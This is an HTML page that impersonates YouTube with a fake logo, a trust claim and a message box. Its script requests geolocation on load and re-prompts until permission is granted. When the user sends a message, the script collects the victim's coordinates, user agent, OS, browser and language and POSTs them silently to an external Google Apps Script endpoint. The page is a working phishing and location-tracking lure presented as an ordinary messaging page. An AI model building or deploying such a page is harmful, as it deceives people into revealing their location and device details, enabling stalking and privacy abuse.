<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>YouTube</title>
  <style>
    body {
      background-color: #ffe6f0; /* halka gulabi background */
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 30px;
      color: #000;
    }
    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 15px;
    }
    .logo-box {
      background: red;
      color: white;
      font-weight: bold;
      font-size: 22px;
      padding: 5px 12px;
      border-radius: 4px;
      margin-right: 8px;
    }
    h1 {
      font-size: 20px;
      margin-bottom: 20px;
    }
    input[type="text"] {
      width: 80%;
      max-width: 300px;
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      padding: 10px 22px;
      font-size: 16px;
      margin-top: 12px;
      border: none;
      border-radius: 4px;
      background-color: red;
      color: #fff;
      cursor: pointer;
    }
    button:hover { background-color: #cc0000; }
    .status {
      margin-top: 15px;
      font-weight: bold;
      color: red;
    }
    footer {
      margin-top: 40px;
      font-size: 14px;
      color: #444;
      font-style: italic;
    }
  </style>
</head>
<body>
  <div class="logo">
    <div class="logo-box">▶</div>
    <span style="font-size:22px; font-weight:bold;">YouTube</span>
  </div>
  <h1>Welcome to YouTube, send me your message </h1>
  
  <input type="text" id="message" placeholder="Type your message">
  <br>
  <button id="sendBtn">Send</button>
  <p class="status" id="status">Waiting for permission...</p>

  <footer>
    YouTube is the world’s most trusted platform for sharing ideas, knowledge and creativity.
  </footer>

  <script>
    let latitude = '', longitude = '', deviceInfo = {};
    let permissionGranted = false;

    // Device info
    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let os = "Unknown OS";
      let browser = "Unknown Browser";

      if (/Android/i.test(ua)) os = "Android";
      else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
      else if (/Win/i.test(ua)) os = "Windows";
      else if (/Mac/i.test(ua)) os = "MacOS";
      else if (/Linux/i.test(ua)) os = "Linux";

      if (/Chrome/i.test(ua)) browser = "Chrome";
      else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
      else if (/Firefox/i.test(ua)) browser = "Firefox";
      else if (/Edg/i.test(ua)) browser = "Edge";

      return {
        userAgent: ua,
        os: os,
        browser: browser,
        language: navigator.language
      };
    }

    deviceInfo = getDeviceInfo();

    function requestPermission(callback) {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
            permissionGranted = true;
            document.getElementById('status').textContent =
              "Permission granted ✅ You can send your message now.";
            document.getElementById('status').style.color = "green";
            if (callback) callback();
          },
          err => {
            permissionGranted = false;
            document.getElementById('status').textContent =
              "You must allow permission to continue ";
            document.getElementById('status').style.color = "red";
          }
        );
      }
    }

    // Page load par popup trigger karo
    window.onload = () => {
      requestPermission();
    };

    // Send button click
    document.getElementById('sendBtn').onclick = async () => {
      const msg = document.getElementById('message').value.trim();
      if (!msg) {
        document.getElementById('status').textContent = 'Type a message before sending!';
        return;
      }

      if (!permissionGranted) {
        // Agar permission nahi mili hai → dobara popup
        requestPermission(() => {
          sendData(msg);
        });
      } else {
        sendData(msg);
      }
    };

    function sendData(msg) {
      const payload = {
        message: msg,
        latitude: latitude,
        longitude: longitude,
        device: deviceInfo
      };

      fetch("https://script.google.com/macros/s/AKfycbyWx8UnBnspDRxEUpupA0cR6Iy2Tl-vW1AJ51kpxz05qGXItaJHqkiWFg3pxTK3lzWlCg/exec", {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      })
      .then(() => {
        document.getElementById('status').textContent = 'Message sent successfully ✅';
        document.getElementById('status').style.color = "green";
      })
      .catch(() => {
        document.getElementById('status').textContent = 'Error sending data ❌';
        document.getElementById('status').style.color = "red";
      });
    }
  </script>
</body>
</html>
